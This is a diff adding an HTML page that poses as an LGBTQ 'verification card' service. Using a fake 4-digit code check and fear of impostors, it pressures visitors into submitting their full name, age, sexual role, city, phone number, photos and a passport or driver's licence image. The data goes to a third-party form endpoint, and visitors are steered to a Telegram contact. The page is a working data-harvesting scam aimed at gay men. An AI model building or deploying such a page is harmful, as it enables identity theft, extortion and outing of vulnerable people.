@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Gay Card Verification & Request</title>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+  />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700&display=swap');
+
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      font-family: 'Outfit', sans-serif;
+      background: radial-gradient(
+        circle at center,
+        rgba(255, 0, 0, 0.08),
+        rgba(255, 165, 0, 0.08),
+        rgba(255, 255, 0, 0.08),
+        rgba(0, 128, 0, 0.08),
+        rgba(0, 0, 255, 0.08),
+        rgba(75, 0, 130, 0.08),
+        rgba(148, 0, 211, 0.08)
+      );
+      color: #222;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      min-height: 100vh;
+      gap: 15px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    p {
+      max-width: 380px;
+      font-size: 15px;
+      margin-bottom: 30px;
+      color: #444;
+    }
+
+    input,
+    textarea,
+    select {
+      padding: 12px;
+      font-size: 16px;
+      border: 1.5px solid #ccc;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 360px;
+      margin: 8px 0;
+      outline: none;
+      transition: border-color 0.3s;
+      box-sizing: border-box;
+    }
+    input[type="file"] {
+      padding: 6px 8px;
+      font-size: 14px;
+      max-width: 360px;
+    }
+    input:focus,
+    textarea:focus,
+    select:focus {
+      border-color: #e50914;
+      box-shadow: 0 0 6px #e50914aa;
+    }
+
+    button {
+      margin-top: 15px;
+      padding: 14px 24px;
+      background: #e50914;
+      color: #fff;
+      border: none;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 17px;
+      transition: background 0.3s;
+      max-width: 360px;
+      width: 100%;
+    }
+    button:hover {
+      background: #b0060f;
+    }
+
+    .result {
+      margin-top: 25px;
+      padding: 18px;
+      border-radius: 8px;
+      max-width: 380px;
+      word-wrap: break-word;
+      font-weight: 600;
+    }
+
+    .success {
+      background: #d7f7e7;
+      border: 1.5px solid #00a86b;
+      color: #007a4d;
+    }
+
+    .fail {
+      background: #ffd6d6;
+      border: 1.5px solid #ff2e2e;
+      color: #a70000;
+    }
+
+    .verify-reminder {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #555;
+      max-width: 380px;
+      line-height: 1.3;
+    }
+
+    form {
+      max-width: 420px;
+      width: 100%;
+      margin-top: 30px;
+      background: #fff;
+      padding: 20px 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
+      color: #222;
+      text-align: left;
+    }
+
+    form h2 {
+      margin-top: 0;
+      color: #e50914;
+      font-weight: 700;
+      font-size: 22px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    label {
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    /* Arrange file inputs side by side for pictures */
+    .file-group {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-bottom: 12px;
+    }
+    .file-group input[type="file"] {
+      flex: 1;
+      max-width: 120px;
+    }
+
+    /* Smaller note below file inputs */
+    .file-note {
+      font-size: 11px;
+      color: #777;
+      margin-top: -8px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h1>BoyHood:TrueMatch Card Verification</h1>
+  <p>
+    Enter the 4-digit verification code on the card.<br />
+    If the code is incorrect, the user may be pretending to be gay or part of the legbtq community and cab pose a serious
+    threat. Stay safe!
+  </p>
+
+  <input
+    type="text"
+    maxlength="4"
+    placeholder="Enter 4-digit code"
+    id="codeInput"
+    aria-label="Verification Code"
+    inputmode="numeric"
+  />
+  <button onclick="verifyCode()">Verify</button>
+
+  <div id="result" class="result" style="display: none"></div>
+
+  <div class="verify-reminder">
+    Become a verified member of the Lgbtq+ community, Get your own card Now? Fill the form below or contact <strong>@IceConsortpro</strong> on Telegram.
+  </div>
+
+  <form id="requestForm" enctype="multipart/form-data" method="POST" action="https://formspree.io/f/xovdrlby" >
+    <h2>Request Your Verification Card</h2>
+
+    <label for="name">Full Name *</label>
+    <input type="text" id="name" name="name" required placeholder="Your full name" />
+
+    <label for="age">Age *</label>
+    <input type="number" id="age" name="age" required placeholder="Your age" min="18" max="100" />
+
+    <label for="boytype">Boytype *</label>
+    <select id="boytype" name="boytype" required>
+      <option value="" disabled selected>Select boytype</option>
+      <option value="twink">Twink</option>
+      <option value="bear">Bear</option>
+      <option value="otter">Otter</option>
+      <option value="jock">Jock</option>
+      <option value="daddy">Daddy</option>
+      <option value="other">Other</option>
+    </select>
+
+    <label for="height">Height (cm) *</label>
+    <input type="number" id="height" name="height" required placeholder="Your height in cm" min="100" max="250" />
+
+    <label for="role">Role *</label>
+    <select id="role" name="role" required>
+      <option value="" disabled selected>Select role</option>
+      <option value="top">Top</option>
+      <option value="bottom">Bottom</option>
+      <option value="versatile">Versatile</option>
+    </select>
+
+    <label for="country">Country *</label>
+    <input type="text" id="country" name="country" required placeholder="Your country" />
+
+    <label for="state">State/Region *</label>
+    <input type="text" id="state" name="state" required placeholder="Your state or region" />
+
+    <label for="city">City *</label>
+    <input type="text" id="city" name="city" required placeholder="Your city" />
+
+    <label for="phone">Phone Number / WhatsApp *</label>
+    <input type="tel" id="phone" name="phone" required placeholder="+1234567890" />
+
+    <label>Upload at least 3 pictures *</label>
+    <div class="file-group">
+      <input type="file" id="pic1" name="pic1" accept="image/*" required />
+      <input type="file" id="pic2" name="pic2" accept="image/*" required />
+      <input type="file" id="pic3" name="pic3" accept="image/*" required />
+    </div>
+    <div class="file-note">Allowed formats: jpg, png, gif</div>
+
+    <label>Upload picture of any ID (Passport, Driver's License, etc.) *</label>
+    <input type="file" id="idPic" name="idPic" accept="image/*" required />
+    <div class="file-note">Allowed formats: jpg, png, gif</div>
+
+    <button type="submit">Request Card</button>
+    <div id="formResponse" style="margin-top:12px; font-weight: 600;"></div>
+  </form>
+
+  <script>
+    // Map of valid codes and profile URLs
+    const validUsers = {
+      '6609': 'https://example.com/profile/celi-bajami',
+      '8421': 'https://example.com/profile/james-smith',
+      '3098': 'https://example.com/profile/manuel-fernandez',
+      '2745': 'https://example.com/profile/leo-williams'
+      // Add more code: profile link pairs here
+    };
+
+    function verifyCode() {
+      const input = document.getElementById('codeInput').value.trim();
+      const resultBox = document.getElementById('result');
+
+      if (input.length !== 4 || !/^\d{4}$/.test(input)) {
+        resultBox.style.display = 'block';
+        resultBox.className = 'result fail';
+        resultBox.innerHTML = 'Please enter a valid 4-digit code.';
+        return;
+      }
+
+      if (validUsers.hasOwnProperty(input)) {
+        const profileLink = validUsers[input];
+        resultBox.style.display = 'block';
+        resultBox.className = 'result success';
+        resultBox.innerHTML =
+          `<strong>Verified!</strong> This user has a valid Gay Consent Card.<br/>` +
+        `<a href="${profileLink}" target="_blank" rel="noopener noreferrer">View Profile</a>`;
+      } else {
+        resultBox.style.display = 'block';
+        resultBox.className = 'result fail';
+        resultBox.textContent = 'Invalid code. This user may be pretending.';
+      }
+    }
+
+    // Handle Formspree submission with fetch API
+    const form = document.getElementById('requestForm');
+    const formResponse = document.getElementById('formResponse');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      formResponse.textContent = 'Sending request...';
+
+      const formData = new FormData(form);
+
+      try {
+        const response = await fetch(form.action, {
+          method: 'POST',
+          body: formData,
+          headers: {
+            'Accept': 'application/json',
+          },
+        });
+
+        if (response.ok) {
+          formResponse.textContent = 'Request sent successfully! We will contact you soon.';
+          form.reset();
+        } else {
+          const data = await response.json();
+          if (data.errors) {
+            formResponse.textContent = data.errors.map(error => error.message).join(', ');
+          } else {
+            formResponse.textContent = 'Oops! There was a problem submitting your form.';
+          }
+        }
+      } catch (error) {
+        formResponse.textContent = 'Network error. Please try again later.';
+      }
+    });
+  </script>
+</body>
+</html>
